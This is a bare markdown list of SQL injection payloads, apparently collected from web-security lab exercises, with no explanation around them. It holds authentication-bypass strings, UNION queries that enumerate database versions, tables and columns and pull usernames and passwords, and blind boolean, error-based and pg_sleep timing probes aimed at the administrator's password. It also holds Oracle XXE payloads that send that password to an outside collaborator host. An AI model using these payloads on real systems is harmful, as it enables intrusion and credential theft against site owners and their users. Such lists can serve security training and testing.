# SQL Injection Payloads  
  
  >Sample SQL Injection payloads.  

```SQL
'+OR+1=1--
administrator'--
```

```SQL
'+UNION+SELECT+'abc','def'--
'+UNION+SELECT+'abc','def','ghi'--
'+UNION+SELECT+'abc','def','ghi','jkl'--
'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
'+UNION+SELECT+table_name,+NULL+NULL+FROM+information_schema.tables--
'+UNION+SELECT+NULL,NULL--
'+UNION+SELECT+NULL,NULL,NULL--
'+UNION+SELECT+NULL,NULL,NULL,NULL--
'+UNION+SELECT+'abcdef',NULL,NULL--
'+UNION+SELECT+NULL,'abcdef',NULL,NULL--
'+UNION+SELECT+@@version,+NULL#
'+UNION+SELECT+@@version,+NULL,+NULL#
'+UNION+SELECT+BANNER,+NULL,+NULL+FROM+v$version--
'+UNION+SELECT+@@version,+NULL#
'+UNION+SELECT+table_name,NULL+FROM+all_tables--
'+UNION+SELECT+table_name,NULL,NULL+FROM+all_tables--
Lifestyle'+ORDER+BY+3--
Lifestyle'+UNION+SELECT+'text','text'--
```

```sql
'+UNION+SELECT+username,+password+FROM+users--
'+UNION+SELECT+NULL,username||'~'||password+FROM+users--
'+UNION+SELECT+NULL,NULL,username||'~'||password+FROM+users--
'+UNION+SELECT+username_abcdef,+password_abcdef+FROM+users_abcdef--
'+UNION+SELECT+USERNAME_ABCDEF,+PASSWORD_ABCDEF+FROM+USERS_ABCDEF--
' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator')='a
'||(SELECT CASE WHEN SUBSTR(password,2,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
'||pg_sleep(10)--
'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,20,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--"
'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d""1.0""+encoding%3d""UTF-8""%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+""http%3a//YOUR-COLLABORATOR-ID.burpcollaborator.net/"">+%25remote%3b]>'),'/l')+FROM+dual--"
'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d""1.0""+encoding%3d""UTF-8""%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+""http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.YOUR-COLLABORATOR-ID.burpcollaborator.net/"">+%25remote%3b]>'),'/l')+FROM+dual--
'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='users_bmudna'--
'+UNION+SELECT+USERNAME_ABCDEF,+PASSWORD_ABCDEF+FROM+USERS_ABCDEF--
```

```SQL
'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_bmudna'--
'+UNION+SELECT+username_pyqajm,+password_hqxvnr+FROM+users_bmudna--
```
